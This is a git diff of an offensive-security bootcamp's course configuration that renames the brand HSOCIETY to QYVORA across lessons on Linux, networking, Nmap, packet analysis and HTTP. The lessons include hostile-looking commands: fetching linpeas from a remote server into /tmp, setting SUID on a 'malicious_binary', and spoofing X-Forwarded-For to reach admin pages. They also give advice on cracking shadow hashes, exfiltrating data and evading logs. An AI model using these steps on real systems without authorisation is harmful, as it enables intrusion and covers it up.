@@ -100,7 +100,7 @@ export const BOOTCAMP_CONFIG: BootcampConfig = {
           id: 'room1',
           title: 'Introduction to Offensive Security',
           overview:
-            'Offensive security is the practice of thinking and acting like an attacker — with permission — to find weaknesses before real adversaries do. This room explains what the field is, why it exists, and how HSOCIETY fits into it.',
+            'Offensive security is the practice of thinking and acting like an attacker — with permission — to find weaknesses before real adversaries do. This room explains what the field is, why it exists, and how QYVORA fits into it.',
           estimatedMinutes: 20,
           steps: [
             {
@@ -120,15 +120,15 @@ In your notes, write down the key difference between offensive and defensive sec
               image: 'step-01.webp',
             },
             {
-              title: 'The HSOCIETY Operating Model',
+              title: 'The QYVORA Operating Model',
               instruction:
-                `HSOCIETY is built on three pillars: **education**, **execution**, and **community**. Understanding this model tells you exactly what you are training for and how the programme is structured.
+                `QYVORA is built on three pillars: **education**, **execution**, and **community**. Understanding this model tells you exactly what you are training for and how the programme is structured.
 
 **Education** — You are here. The bootcamp gives you the technical foundation, the methodology, and the mindset. No prior experience is assumed. Everything is built from first principles.
 
 **Execution** — After the bootcamp, you apply what you have learned in real engagements: CTF competitions, bug bounty programmes, and eventually client work. Execution is where theory becomes skill.
 
-**Community** — Offensive security is a team sport. The HSOCIETY community is where you share findings, ask questions, collaborate on challenges, and build your reputation as an operator.
+**Community** — Offensive security is a team sport. The QYVORA community is where you share findings, ask questions, collaborate on challenges, and build your reputation as an operator.
 
 Write down what each pillar means to you personally. Be specific — not "I want to learn hacking" but "I want to be able to conduct a web application penetration test independently within six months."`,
               image: 'step-02.webp',
@@ -287,13 +287,13 @@ Document the full responsible disclosure process in your notes. Include what you
           id: 'room1',
           title: 'Linux Basics & Navigation',
           overview:
-            "To become an HSociety Hacker, you must first master the environment where we live: the Linux terminal. This isn't just about typing commands; it's about learning the language of the machine. In this room, you will transition from a curious observer to a skilled operator, building the 'muscle memory' required for high-stakes engagements.",
+            "To become an Qyvora Hacker, you must first master the environment where we live: the Linux terminal. This isn't just about typing commands; it's about learning the language of the machine. In this room, you will transition from a curious observer to a skilled operator, building the 'muscle memory' required for high-stakes engagements.",
           estimatedMinutes: 35,
           steps: [
             {
-              title: 'The HSociety Command Center',
+              title: 'The Qyvora Command Center',
               instruction:
-                `The terminal is your cockpit. Every HSociety Hacker starts here, learning to interact with the system without the crutches of a GUI. As you train like a hacker, you'll realize that the terminal provides a level of precision and speed that point-and-click interfaces can never match.
+                `The terminal is your cockpit. Every Qyvora Hacker starts here, learning to interact with the system without the crutches of a GUI. As you train like a hacker, you'll realize that the terminal provides a level of precision and speed that point-and-click interfaces can never match.
 
 **1. Environmental Awareness:**
 Before doing anything, you need to know what kind of environment you've just landed in.
@@ -314,7 +314,7 @@ A professional operator never types the same long command twice. Use these to mo
 # Search your command history (Use Ctrl+R for a live search!)
 history | tail -n 20
 
-# Create an 'alias' to save time on common HSociety tasks
+# Create an 'alias' to save time on common Qyvora tasks
 alias ll='ls -lah --color=auto'
 
 # Clear your tracks (visually) when the screen gets messy
@@ -322,7 +322,7 @@ clear
 \`\`\`
 
 **3. The Global Directory Structure:**
-Linux is organized like a giant tree. As an HSociety Hacker, you should know exactly where the 'prizes' are hidden.
+Linux is organized like a giant tree. As an Qyvora Hacker, you should know exactly where the 'prizes' are hidden.
 - \`/root\` — The ultimate goal. The home of the system administrator.
 - \`/home\` — Where the users live. A goldmine for personal files and SSH keys.
 - \`/var/log\` — The 'Black Box.' This records everything that happens. A smart hacker knows how to read these — and how to stay out of them.
@@ -367,7 +367,7 @@ whatis grep
 apropos network
 \`\`\`
 
-*Training Task:* Use \`export\` to set a variable named \`CODENAME\` to your hacker handle. Then use \`echo\` to print it. Congratulations, you've just taken your first step in the HSociety training program.`,
+*Training Task:* Use \`export\` to set a variable named \`CODENAME\` to your hacker handle. Then use \`echo\` to print it. Congratulations, you've just taken your first step in the Qyvora training program.`,
               image: 'step-01.webp',
             },
             {
@@ -376,7 +376,7 @@ apropos network
                 `In a real-world engagement, you won't always have a map. You need to be able to jump between directories and locate sensitive data in seconds. To train like a hacker is to be fast and invisible.
 
 **1. Teleportation Shortcuts:**
-Move across the HSociety environment without breaking your flow.
+Move across the Qyvora environment without breaking your flow.
 \`\`\`bash
 # Jump to the previous directory you were in
 cd -
@@ -399,7 +399,7 @@ popd
 \`\`\`
 
 **3. The Power of 'Find':**
-Finding a specific file in a sea of data is a core HSociety skill.
+Finding a specific file in a sea of data is a core Qyvora skill.
 \`\`\`bash
 # Find files modified in the last 10 minutes (Spot active logs!)
 find /var/log -mmin -10 2>/dev/null
@@ -424,14 +424,14 @@ locate secret.txt
 **5. Creating Your Own Workspace:**
 \`\`\`bash
 # Create a nested directory structure for your engagement
-mkdir -p ./hsociety/recon/targets
+mkdir -p ./qyvora/recon/targets
 
 # Create a symlink (a shortcut) to a deep directory
 ln -s /var/www/html/uploads/images ./my_shortcut
 \`\`\`
 
 **6. Safe File Deletion:**
-As an HSociety Hacker, you leave no trace.
+As an Qyvora Hacker, you leave no trace.
 \`\`\`bash
 # Delete a file permanently
 rm target_evidence.log
@@ -455,7 +455,7 @@ When you run \`ls -l\`, you see something like \`-rwxr-xr-x\`.
 - **x (1)**: Execute (run) access.
 
 **2. Checking for Weak Points:**
-HSociety Hackers look for "World Writable" files — these are misconfigurations that allow anyone to change sensitive data.
+Qyvora Hackers look for "World Writable" files — these are misconfigurations that allow anyone to change sensitive data.
 \`\`\`bash
 # Find files that EVERYONE can write to (A huge security hole!)
 find / -perm -o+w -type f 2>/dev/null
@@ -509,7 +509,7 @@ su trainee_02 -c "ls /home/trainee_02"
             {
               title: 'Reading, Filtering & Data Extraction',
               instruction:
-                `The true skill of an HSociety Hacker is finding the 'signal' in the 'noise.' Servers generate millions of lines of logs; your job is to extract the few lines that contain passwords, usernames, or vulnerabilities.
+                `The true skill of an Qyvora Hacker is finding the 'signal' in the 'noise.' Servers generate millions of lines of logs; your job is to extract the few lines that contain passwords, usernames, or vulnerabilities.
 
 **1. The Basic Readers:**
 \`\`\`bash
@@ -566,7 +566,7 @@ cat data.csv | sed '1d'
 \`\`\`
 
 **6. Combining Everything (The Pipeline):**
-This is where you become a true HSociety Hacker.
+This is where you become a true Qyvora Hacker.
 \`\`\`bash
 # Find the top 5 most common IP addresses in your logs
 cat /var/log/access.log | cut -d " " -f 1 | sort | uniq -c | sort -nr | head -n 5
@@ -581,7 +581,7 @@ cat /var/log/access.log | cut -d " " -f 1 | sort | uniq -c | sort -nr | head -n 
           id: 'room2',
           title: 'Users, Groups & Permissions',
           overview:
-            "Identity is the cornerstone of security. In this room, you'll learn how Linux identifies who is a friend and who is a potential intruder. By mastering user accounts, shadow files, and privilege escalation pathways, you will learn to navigate the HSociety network like a ghost in the machine.",
+            "Identity is the cornerstone of security. In this room, you'll learn how Linux identifies who is a friend and who is a potential intruder. By mastering user accounts, shadow files, and privilege escalation pathways, you will learn to navigate the Qyvora network like a ghost in the machine.",
           estimatedMinutes: 30,
           steps: [
             {
@@ -640,7 +640,7 @@ grep -E "sh$|bash$" /etc/passwd
 **5. System Uptime & Load:**
 Knowing how long a system has been up can tell you if it's been recently patched.
 \`\`\`bash
-# Check how long the HSociety target has been running
+# Check how long the Qyvora target has been running
 uptime
 
 # See the system's 'ID' in the kernel's eyes
@@ -656,7 +656,7 @@ useradd -D
 sudo chage -l $(whoami)
 \`\`\`
 
-*Identity Check:* Run \`id\`. If you see \`uid=0\`, you have achieved total control. If not, your HSociety training continues. How many groups are you currently a member of?`,
+*Identity Check:* Run \`id\`. If you see \`uid=0\`, you have achieved total control. If not, your Qyvora training continues. How many groups are you currently a member of?`,
               image: 'step-01.webp',
             },
             {
@@ -722,13 +722,13 @@ grep "nologin" /etc/passwd | cut -d ":" -f 1
 awk -F: '$6 ~ /\\/home/ && $7 ~ /nologin/ {print $1}' /etc/passwd
 \`\`\`
 
-*HSociety Insight:* In the \`shadow\` file, the string between the first and second \`$\` is the salt. A hacker uses this salt along with the hash to perform 'Brute Force' or 'Dictionary' attacks offline.`,
+*Qyvora Insight:* In the \`shadow\` file, the string between the first and second \`$\` is the salt. A hacker uses this salt along with the hash to perform 'Brute Force' or 'Dictionary' attacks offline.`,
               image: 'step-02.webp',
             },
             {
               title: 'Advanced Permissions Manipulation',
               instruction:
-                `To become an HSociety Hacker, you must learn to manipulate the environment to suit your needs. Whether it's locking down your tools or creating a back-door, \`chmod\` and \`chown\` are your primary instruments.
+                `To become an Qyvora Hacker, you must learn to manipulate the environment to suit your needs. Whether it's locking down your tools or creating a back-door, \`chmod\` and \`chown\` are your primary instruments.
 
 **1. The Octal vs Symbolic Mastery:**
 \`\`\`bash
@@ -742,14 +742,14 @@ chmod go-wx public_file.txt
 **2. Recursive Ownership Changes:**
 \`\`\`bash
 # Change the owner of an entire folder and everything inside it
-sudo chown -R $(whoami):$(whoami) ./hsociety_tools
+sudo chown -R $(whoami):$(whoami) ./qyvora_tools
 
 # Use a 'Reference' file to set permissions (Match the target's look!)
 chmod --reference=/etc/passwd my_fake_passwd
 \`\`\`
 
 **3. Special Bit Manipulation:**
-Beyond R, W, and X, there are special bits that HSociety Hackers look for.
+Beyond R, W, and X, there are special bits that Qyvora Hackers look for.
 \`\`\`bash
 # Set the SUID bit (File runs as the owner)
 chmod u+s malicious_binary
@@ -779,7 +779,7 @@ umask 077
 
 **6. Group Management (Moving Laterally):**
 \`\`\`bash
-# Create a new group for your HSociety team
+# Create a new group for your Qyvora team
 sudo groupadd hs_redteam
 
 # Add a user to a group without removing them from others
@@ -792,7 +792,7 @@ sudo usermod -aG sudo trainee_01
             {
               title: 'Sudo: The Path to Absolute Control',
               instruction:
-                `The final step in mastering identity is the \`sudo\` command. It is the bridge between a mere trainee and a full-fledged HSociety Hacker. Understanding how to audit and abuse sudo configurations is the key to system-wide dominance.
+                `The final step in mastering identity is the \`sudo\` command. It is the bridge between a mere trainee and a full-fledged Qyvora Hacker. Understanding how to audit and abuse sudo configurations is the key to system-wide dominance.
 
 **1. Auditing Your Privileges:**
 \`\`\`bash
@@ -859,7 +859,7 @@ sudo tail -n 50 /var/log/auth.log | grep sudo
             {
               title: 'Monitoring the Heartbeat (Processes)',
               instruction:
-                `Every program on Linux is a process. As an HSociety Hacker, you must know how to spot unusual activity, identify service accounts, and even manipulate running programs to your advantage.
+                `Every program on Linux is a process. As an Qyvora Hacker, you must know how to spot unusual activity, identify service accounts, and even manipulate running programs to your advantage.
 
 **1. Deep Process Inspection:**
 \`\`\`bash
@@ -922,13 +922,13 @@ pgrep -a apache
 sudo lsof -i :80
 \`\`\`
 
-*Hacker's Insight:* If you see a process running as root from the \`/tmp\` or \`/dev/shm\` directory, it's a major red flag. HSociety Hackers use these directories to hide their temporary tools.`,
+*Hacker's Insight:* If you see a process running as root from the \`/tmp\` or \`/dev/shm\` directory, it's a major red flag. Qyvora Hackers use these directories to hide their temporary tools.`,
               image: 'step-01.webp',
             },
             {
               title: 'Mapping the Exposure (Network Ports)',
               instruction:
-                `Every open port is a potential entry point into the HSociety network. Before you can become a hacker, you must learn to map these 'doors' and understand which services are listening for a connection.
+                `Every open port is a potential entry point into the Qyvora network. Before you can become a hacker, you must learn to map these 'doors' and understand which services are listening for a connection.
 
 **1. Auditing Listening Services:**
 \`\`\`bash
@@ -972,7 +972,7 @@ ip neighbor show
 # See which DNS servers this target is using
 cat /etc/resolv.conf
 
-# Check the local 'Hosts' file for internal HSociety mappings
+# Check the local 'Hosts' file for internal Qyvora mappings
 cat /etc/hosts
 \`\`\`
 
@@ -991,7 +991,7 @@ netstat -pant
             {
               title: 'Remote Interaction & Data Transfer',
               instruction:
-                `To train like a hacker, you must master the art of moving data between systems. Whether it's exfiltrating a database or uploading your custom HSociety toolkit, these commands are your lifeline.
+                `To train like a hacker, you must master the art of moving data between systems. Whether it's exfiltrating a database or uploading your custom Qyvora toolkit, these commands are your lifeline.
 
 **1. The Web-Based Extractors:**
 \`\`\`bash
@@ -1002,7 +1002,7 @@ wget http://<remote_server_ip>/tools/linpeas.sh -O /tmp/linpeas.sh
 curl -I http://<target_ip>
 
 # Send a custom User-Agent to bypass simple blocks
-curl -H "User-Agent: HSociety-Hacker-Trainee" http://<target_ip>
+curl -H "User-Agent: Qyvora-Hacker-Trainee" http://<target_ip>
 \`\`\`
 
 **2. Secure Data Transfer (SCP & Rsync):**
@@ -1015,7 +1015,7 @@ rsync -avz ./recon_data/ hacker@<target_ip>:~/backup/
 \`\`\`
 
 **3. Interacting with Raw Sockets (Netcat):**
-Netcat is the "Swiss Army Knife" of every HSociety Hacker.
+Netcat is the "Swiss Army Knife" of every Qyvora Hacker.
 \`\`\`bash
 # Connect to a web server and manually send a GET request
 echo -e "GET / HTTP/1.0\r\n\r\n" | nc -nv <target_ip> 80
@@ -1049,13 +1049,13 @@ ssh -D 1080 hacker@<target_ip>
 iperf3 -c <target_ip>
 \`\`\`
 
-*Experiment:* Use \`curl\` to visit \`http://<remote_server_ip>\`. If it fails, try adding \`-k\` to ignore SSL errors or \`-L\` to follow redirects. Every failure is a lesson in the HSociety program.`,
+*Experiment:* Use \`curl\` to visit \`http://<remote_server_ip>\`. If it fails, try adding \`-k\` to ignore SSL errors or \`-L\` to follow redirects. Every failure is a lesson in the Qyvora program.`,
               image: 'step-03.webp',
             },
             {
               title: 'Mastering Persistence & Background Tasks',
               instruction:
-                `A professional HSociety Hacker never waits for a slow scan to finish. You must learn to multi-task, leaving your tools running in the background while you move on to the next objective. Master the chaos, and you master the system.
+                `A professional Qyvora Hacker never waits for a slow scan to finish. You must learn to multi-task, leaving your tools running in the background while you move on to the next objective. Master the chaos, and you master the system.
 
 **1. Backgrounding & Jobs:**
 \`\`\`bash
@@ -1081,7 +1081,7 @@ disown
 \`\`\`
 
 **3. The Power of Tmux (Terminal Multiplexing):**
-Tmux is the preferred environment for every HSociety Hacker.
+Tmux is the preferred environment for every Qyvora Hacker.
 \`\`\`bash
 # Start a new named session
 tmux new -s hs_engagement
@@ -1126,7 +1126,7 @@ systemctl list-units --type=service
 systemctl status sshd
 \`\`\`
 
-*Hacker Tip:* Use \`Ctrl+Z\` to temporarily pause a running program, then type \`bg\` to keep it running in the background. You've just learned to multitask like a true HSociety Hacker.`,
+*Hacker Tip:* Use \`Ctrl+Z\` to temporarily pause a running program, then type \`bg\` to keep it running in the background. You've just learned to multitask like a true Qyvora Hacker.`,
               image: 'step-04.webp',
             },
           ],
@@ -1135,13 +1135,13 @@ systemctl status sshd
           id: 'room4',
           title: 'Scripting Fundamentals',
           overview:
-            "A hacker who cannot script is like a soldier who cannot aim. Automation is what separates the average user from the HSociety elite. In this room, you will learn to build your own custom tools, automating the boring tasks so you can focus on the critical breakthroughs. Train like a hacker, automate like a pro.",
+            "A hacker who cannot script is like a soldier who cannot aim. Automation is what separates the average user from the Qyvora elite. In this room, you will learn to build your own custom tools, automating the boring tasks so you can focus on the critical breakthroughs. Train like a hacker, automate like a pro.",
           estimatedMinutes: 40,
           steps: [
             {
               title: 'Hacker Automation: The First Script',
               instruction:
-                `Every HSociety toolkit started with a single script. Bash scripting allows you to chain commands together, creating a powerful multiplier for your efforts. As you become a hacker, you'll realize that consistency is key — and scripts provide exactly that.
+                `Every Qyvora toolkit started with a single script. Bash scripting allows you to chain commands together, creating a powerful multiplier for your efforts. As you become a hacker, you'll realize that consistency is key — and scripts provide exactly that.
 
 **1. The Foundation (Shebang & Permissions):**
 Every script must start with a 'Shebang' to tell Linux which interpreter to use.
@@ -1152,7 +1152,7 @@ touch recon.sh
 # The standard Shebang line
 echo "#!/bin/bash" > recon.sh
 
-# Make it executable (Essential HSociety step)
+# Make it executable (Essential Qyvora step)
 chmod +x recon.sh
 \`\`\`
 
@@ -1173,10 +1173,10 @@ echo "New Target: <target_ip>" >> targets.txt
 Professional scripts are well-documented so your team can use them.
 \`\`\`bash
 #!/bin/bash
-# HSociety Recon Script v1.0
+# Qyvora Recon Script v1.0
 # Author: Trainee-Hacker
 
-echo "[*] Starting HSociety System Report..."
+echo "[*] Starting Qyvora System Report..."
 echo "------------------------------------"
 \`\`\`
 
@@ -1215,7 +1215,7 @@ log_action() {
 log_action "Scanning target: <target_ip>"
 \`\`\`
 
-*Self-Check:* Create a script that prints "Training to be an HSociety Hacker" and saves it to a file named \`goal.txt\`. Use the commands you've learned to make it executable and run it.`,
+*Self-Check:* Create a script that prints "Training to be an Qyvora Hacker" and saves it to a file named \`goal.txt\`. Use the commands you've learned to make it executable and run it.`,
               image: 'step-01.webp',
             },
             {
@@ -1232,7 +1232,7 @@ TARGET_IP="<target_ip>"
 ping -c 1 $TARGET_IP
 
 # Read input from the user during execution
-echo -n "Enter HSociety Access Code: "
+echo -n "Enter Qyvora Access Code: "
 read -s CODE  # -s hides the input (perfect for passwords!)
 \`\`\`
 
@@ -1289,17 +1289,17 @@ STAGED_PATH="/tmp/hs_tool"
 echo "New Path: $\{STAGED_PATH/tmp/dev/shm}"
 \`\`\`
 
-*Training Task:* Write a script that takes a username as an argument and checks if they exist in \`/etc/passwd\`. If they do, print "Target found in HSociety database."`,
+*Training Task:* Write a script that takes a username as an argument and checks if they exist in \`/etc/passwd\`. If they do, print "Target found in Qyvora database."`,
               image: 'step-02.webp',
             },
             {
               title: 'Loops: The Multiplier of Effort',
               instruction:
-                `Loops are the engine of automation. Why scan one IP when you can scan a thousand? As an HSociety Hacker, you will use loops to perform mass enumeration, brute-forcing, and data harvesting across entire networks.
+                `Loops are the engine of automation. Why scan one IP when you can scan a thousand? As an Qyvora Hacker, you will use loops to perform mass enumeration, brute-forcing, and data harvesting across entire networks.
 
 **1. The 'For' Loop Mastery:**
 \`\`\`bash
-# Loop through a known list of HSociety servers
+# Loop through a known list of Qyvora servers
 for HOST in <target_ip_1> <target_ip_2> <api_internal>; do
     echo "Pinging $HOST..."
     nc -zv $HOST 80 2>&1 | grep "open"
@@ -1343,7 +1343,7 @@ done
 \`\`\`bash
 # Stop a loop early if we find what we need
 for PASS in $(cat wordlist.txt); do
-    if [ "$PASS" == "hsociety123" ]; then
+    if [ "$PASS" == "qyvora123" ]; then
         echo "[!] Found the secret key!"
         break
     fi
@@ -1359,7 +1359,7 @@ while true; do
 done
 \`\`\`
 
-*Challenge:* Create a loop that prints the numbers 10 down to 1, followed by "LIFTOFF - You are now an HSociety Hacker!"`,
+*Challenge:* Create a loop that prints the numbers 10 down to 1, followed by "LIFTOFF - You are now an Qyvora Hacker!"`,
               image: 'step-03.webp',
             },
             {
@@ -1371,7 +1371,7 @@ done
 \`\`\`bash
 # Check if you are running as root
 if [ $(id -u) -eq 0 ]; then
-    echo "[!] WARNING: Running with full HSociety privileges!"
+    echo "[!] WARNING: Running with full Qyvora privileges!"
 else
     echo "[*] Standard trainee access."
 fi
@@ -1419,7 +1419,7 @@ fi
 **6. Combining Logic into a 'Smart Scanner':**
 \`\`\`bash
 #!/bin/bash
-# HSociety Smart Port Checker
+# Qyvora Smart Port Checker
 TARGET="$\{1:-localhost}"
 PORT="$\{2:-80}"
 
@@ -1451,36 +1451,36 @@ fi
           id: 'room1',
           title: 'TCP/IP & OSI Model',
           overview:
-            "Every attack and defense in the HSociety arsenal starts with a fundamental truth: data must move. To become an elite operative, you must look past the screen and see the raw streams of bits traveling through the OSI layers. This room builds the theoretical framework you need to map digital terrain and identify the protocols that underpin everything you will compromise.",
+            "Every attack and defense in the Qyvora arsenal starts with a fundamental truth: data must move. To become an elite operative, you must look past the screen and see the raw streams of bits traveling through the OSI layers. This room builds the theoretical framework you need to map digital terrain and identify the protocols that underpin everything you will compromise.",
           estimatedMinutes: 35,
           steps: [
             {
               title: 'The OSI Model: A Hacker\'s Map',
               instruction:
-                `The OSI (Open Systems Interconnection) model is the conceptual map of the digital battlefield. As an HSociety Hacker, you don't just 'hack a website'; you target a specific layer of the stack.
+                `The OSI (Open Systems Interconnection) model is the conceptual map of the digital battlefield. As an Qyvora Hacker, you don't just 'hack a website'; you target a specific layer of the stack.
 
 **The 7 Layers of Engagement:**
 
 1.  **Layer 7 — Application:** Where the human meets the machine.
     *   *Protocols:* HTTP, DNS, SSH, FTP, SMTP.
-    *   *HSociety Focus:* SQL Injection, XSS, API manipulation.
+    *   *Qyvora Focus:* SQL Injection, XSS, API manipulation.
 2.  **Layer 6 — Presentation:** The translator. Manages encryption and formatting.
     *   *Protocols:* SSL/TLS, JPEG, GIF.
-    *   *HSociety Focus:* Downgrade attacks, certificate spoofing.
+    *   *Qyvora Focus:* Downgrade attacks, certificate spoofing.
 3.  **Layer 5 — Session:** The coordinator. Manages connections.
     *   *Protocols:* RPC, NetBIOS, Sockets.
-    *   *HSociety Focus:* Session hijacking, token theft.
+    *   *Qyvora Focus:* Session hijacking, token theft.
 4.  **Layer 4 — Transport:** The logistics. Manages delivery.
     *   *Protocols:* TCP (Reliable), UDP (Fast).
-    *   *HSociety Focus:* Port scanning, SYN flooding.
+    *   *Qyvora Focus:* Port scanning, SYN flooding.
 5.  **Layer 3 — Network:** The navigator. Manages routing.
     *   *Protocols:* IP, ICMP, IPsec.
-    *   *HSociety Focus:* IP spoofing, ICMP redirect.
+    *   *Qyvora Focus:* IP spoofing, ICMP redirect.
 6.  **Layer 2 — Data Link:** The neighborhood. Manages local hardware.
     *   *Protocols:* Ethernet, Wi-Fi (802.11).
-    *   *HSociety Focus:* ARP poisoning, MAC flooding.
+    *   *Qyvora Focus:* ARP poisoning, MAC flooding.
 7.  **Layer 1 — Physical:** The terrain. The cables and radio waves.
-    *   *HSociety Focus:* RF Jamming, hardware implants.
+    *   *Qyvora Focus:* RF Jamming, hardware implants.
 
 **Command Line Reconnaissance:**
 \`\`\`bash
@@ -1509,7 +1509,7 @@ ip link show eth0 | grep mtu
             {
               title: 'The TCP Three-Way Handshake',
               instruction:
-                `TCP (Transmission Control Protocol) is the "connection-oriented" standard. Before an HSociety operative can extract data, they must understand the 'handshake'—the formal greeting between two systems.
+                `TCP (Transmission Control Protocol) is the "connection-oriented" standard. Before an Qyvora operative can extract data, they must understand the 'handshake'—the formal greeting between two systems.
 
 **The Sequence of Trust:**
 1.  **SYN (Synchronize):** "Hello, I want to talk."
@@ -1555,7 +1555,7 @@ sudo tcpdump -ni any -vvv port 80
             {
               title: 'TCP vs UDP: Reliability vs Speed',
               instruction:
-                `In the HSociety training program, you must choose the right tool for the job. TCP is a certified letter (guaranteed delivery); UDP is a postcard (shout it out and hope they hear).
+                `In the Qyvora training program, you must choose the right tool for the job. TCP is a certified letter (guaranteed delivery); UDP is a postcard (shout it out and hope they hear).
 
 **Common Service Ports:**
 *   **TCP:** 22 (SSH), 80 (HTTP), 443 (HTTPS), 445 (SMB), 3389 (RDP).
@@ -1663,7 +1663,7 @@ sudo tcpdump -n
             {
               title: 'DNS: The Internet\'s Phonebook',
               instruction:
-                `DNS (Domain Name System) is a goldmine for an HSociety operative. It translates human names into IP addresses, but it often reveals much more about a target's internal infrastructure than intended.
+                `DNS (Domain Name System) is a goldmine for an Qyvora operative. It translates human names into IP addresses, but it often reveals much more about a target's internal infrastructure than intended.
 
 **Standard Query Drills:**
 \`\`\`bash
@@ -1784,7 +1784,7 @@ curl -s -I http://<target_ip> | grep -E "Strict-Transport|Content-Security|X-Fra
             {
               title: 'Common Protocols: FTP, SSH & SMTP',
               instruction:
-                `The web is only one part of the surface. HSociety operatives must also master the 'management' protocols that keep servers running. These are often the first place an attacker looks for weak credentials.
+                `The web is only one part of the surface. Qyvora operatives must also master the 'management' protocols that keep servers running. These are often the first place an attacker looks for weak credentials.
 
 **SSH (Secure Shell):**
 \`\`\`bash
@@ -1840,7 +1840,7 @@ sudo tcpdump -i any port 21 or port 22 or port 25
             {
               title: 'Protocol Analysis & Workflow',
               instruction:
-                `To become an HSociety Hacker, you must move beyond running tools and start thinking in workflows. A professional engagement isn't a single command; it's a sequence of observations and reactions.
+                `To become an Qyvora Hacker, you must move beyond running tools and start thinking in workflows. A professional engagement isn't a single command; it's a sequence of observations and reactions.
 
 **The Recon Pipeline:**
 \`\`\`bash
@@ -1897,7 +1897,7 @@ grep -oE "\b([0-9]{1,3}\\.){3}[0-9]{1,3}\b" scan.txt | sort -u
           id: 'room3',
           title: 'Network Scanning & Enumeration',
           overview:
-            "Enumeration is the most critical phase of any engagement. If you don't find it, you can't hack it. In this room, you will master Nmap from first principles, learning to bypass filters and map complex networks like a professional HSociety operative.",
+            "Enumeration is the most critical phase of any engagement. If you don't find it, you can't hack it. In this room, you will master Nmap from first principles, learning to bypass filters and map complex networks like a professional Qyvora operative.",
           estimatedMinutes: 40,
           steps: [
             {
@@ -2046,7 +2046,7 @@ telnet <target_ip> 25
             {
               title: 'The Nmap Scripting Engine (NSE)',
               instruction:
-                `The NSE is what transforms Nmap into a world-class vulnerability scanner. As an HSociety operative, you must master these scripts to automate the discovery of misconfigurations and exploitable flaws.
+                `The NSE is what transforms Nmap into a world-class vulnerability scanner. As an Qyvora operative, you must master these scripts to automate the discovery of misconfigurations and exploitable flaws.
 
 **Using Script Categories:**
 \`\`\`bash
@@ -2114,7 +2114,7 @@ nmap -p 80 --script http-title,http-headers,http-methods,http-enum <target_ip>
             {
               title: 'Building a Professional Recon Workflow',
               instruction:
-                `Elite HSociety operatives don't just run commands; they follow a repeatable, structured workflow that ensures no target is missed. This step teaches you to build a 'Recon Pipeline' that moves from wide discovery to deep exploitation.
+                `Elite Qyvora operatives don't just run commands; they follow a repeatable, structured workflow that ensures no target is missed. This step teaches you to build a 'Recon Pipeline' that moves from wide discovery to deep exploitation.
 
 **Step 1: Discover Live Hosts:**
 \`\`\`bash
@@ -2177,7 +2177,7 @@ script -a engagement_log.txt
           id: 'room4',
           title: 'Packet Analysis',
           overview:
-            "A hacker who cannot read traffic is blind. Packet analysis is the art of seeing through the noise and identifying the exact data that flows through the HSociety network. In this room, you will master Wireshark and Tshark, learning to extract credentials, analyze protocols, and reconstruct entire conversations from raw network captures.",
+            "A hacker who cannot read traffic is blind. Packet analysis is the art of seeing through the noise and identifying the exact data that flows through the Qyvora network. In this room, you will master Wireshark and Tshark, learning to extract credentials, analyze protocols, and reconstruct entire conversations from raw network captures.",
           estimatedMinutes: 35,
           steps: [
             {
@@ -2186,7 +2186,7 @@ script -a engagement_log.txt
                 `Wireshark is the industry-standard tool for microscopic network analysis. To train like a hacker is to understand that every bit in a packet has a purpose. Whether you're hunting for cleartext passwords or analyzing a custom C2 protocol, Wireshark is your X-Ray vision.
 
 **Mastering the Tshark CLI:**
-Professional HSociety operatives often work on remote servers without a GUI. \`tshark\` is the command-line equivalent of Wireshark.
+Professional Qyvora operatives often work on remote servers without a GUI. \`tshark\` is the command-line equivalent of Wireshark.
 \`\`\`bash
 # Capture traffic on eth0 and show only HTTP hosts
 sudo tshark -i eth0 -Y http -T fields -e http.host
@@ -2299,7 +2299,7 @@ tshark -r capture.pcap -Y "tcp.analysis.retransmission"
             {
               title: 'Following & Reconstructing Streams',
               instruction:
-                `Raw packets are just fragments. To truly understand an engagement, an HSociety operative must reconstruct these fragments into a human-readable conversation. Following a stream allows you to see exactly what an attacker sent and what the server replied.
+                `Raw packets are just fragments. To truly understand an engagement, an Qyvora operative must reconstruct these fragments into a human-readable conversation. Following a stream allows you to see exactly what an attacker sent and what the server replied.
 
 **Stream Reconstruction with Tshark:**
 \`\`\`bash
@@ -2400,7 +2400,7 @@ tshark -r capture.pcap -T fields -e ip.src -e dns.qry.name | sort -u
 tshark -r capture.pcap -Y "frame.number == 1234" -V | grep -A 20 "Domain Name System"
 \`\`\`
 
-*Final Training Insight:* A hacker's greatest asset is the protocol everyone trusts. DNS, ICMP, and NTP are often overlooked, but in the hands of an HSociety operative, they are powerful tools for stealthy communication. Congratulations on completing Phase 3.`,
+*Final Training Insight:* A hacker's greatest asset is the protocol everyone trusts. DNS, ICMP, and NTP are often overlooked, but in the hands of an Qyvora operative, they are powerful tools for stealthy communication. Congratulations on completing Phase 3.`,
               image: 'step-04.webp',
             },
           ],
@@ -2419,7 +2419,7 @@ tshark -r capture.pcap -Y "frame.number == 1234" -V | grep -A 20 "Domain Name Sy
           id: 'room1',
           title: 'How the Web Works',
           overview:
-            "Before you can dismantle a web application, you must understand the invisible architecture that supports it. To train like a hacker is to see the web not as a collection of pages, but as a series of stateless HTTP requests and responses. In this room, you will learn to intercept, read, and manipulate the raw data that flows between the browser and the HSociety backend.",
+            "Before you can dismantle a web application, you must understand the invisible architecture that supports it. To train like a hacker is to see the web not as a collection of pages, but as a series of stateless HTTP requests and responses. In this room, you will learn to intercept, read, and manipulate the raw data that flows between the browser and the Qyvora backend.",
           estimatedMinutes: 35,
           steps: [
             {
@@ -2440,7 +2440,7 @@ Each row in the Network tab is a 'packet' of information.
 \`\`\`http
 GET /api/user/profile HTTP/1.1
 Host: <target_ip>1
-User-Agent: Mozilla/5.0 (HSociety Operative)
+User-Agent: Mozilla/5.0 (Qyvora Operative)
 Cookie: session=hacker_session_123
 \`\`\`
 
@@ -2467,7 +2467,7 @@ fetch('/api/status').then(res => res.json()).then(console.log);
             {
               title: 'Mastering HTTP Headers & Fingerprinting',
               instruction:
-                `To become an HSociety Hacker, you must learn to communicate with servers directly from the terminal. HTTP headers are the 'metadata' of the web; they contain the clues that lead to successful exploitation.
+                `To become an Qyvora Hacker, you must learn to communicate with servers directly from the terminal. HTTP headers are the 'metadata' of the web; they contain the clues that lead to successful exploitation.
 
 **Fingerprinting with Curl:**
 \`\`\`bash
@@ -2490,7 +2490,7 @@ curl -H "X-Forwarded-For: 127.0.0.1" http://<target_ip>1/admin
 curl -e "http://<trusted_internal>" http://<target_ip>1/internal
 
 # Send a specific 'Accept' header to find hidden API versions
-curl -H "Accept: application/vnd.hsociety.v2+json" http://<target_ip>1/data
